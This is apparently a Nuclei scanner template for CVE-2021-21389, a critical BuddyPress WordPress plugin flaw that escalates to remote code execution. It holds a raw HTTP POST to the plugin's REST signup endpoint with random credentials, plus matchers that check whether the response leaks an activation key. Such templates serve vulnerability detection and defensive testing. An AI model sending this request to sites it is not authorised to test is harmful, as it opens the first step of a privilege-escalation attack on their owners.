id: CVE-2021-21389
info:
  author: lotusdll
  description: The BuddyPress WordPress plugin was affected by an REST API Privilege
    Escalation to RCE
  name: BuddyPress REST API Privilege Escalation to RCE
  reference: '- https://github.com/HoangKien1020/CVE-2021-21389

    - https://nvd.nist.gov/vuln/detail/CVE-2021-21389

    '
  severity: critical
  tags: cve,cve2021,wordpress,wp-plugin,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - user_login
    - registered
    - activation_key
    - user_email
  matchers-condition: and
  raw:
  - "POST /wp-json/buddypress/v1/signup HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
    \ Chrome/89.0.4389.114 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\
    \n{\n  \"user_login\":\"{{randstr}}\",\n  \"password\":\"{{randstr}}\",\n  \"\
    user_name\":\"{{randstr}}\",\n  \"user_email\":\"{{randstr}}@example.com\"\n}\n"
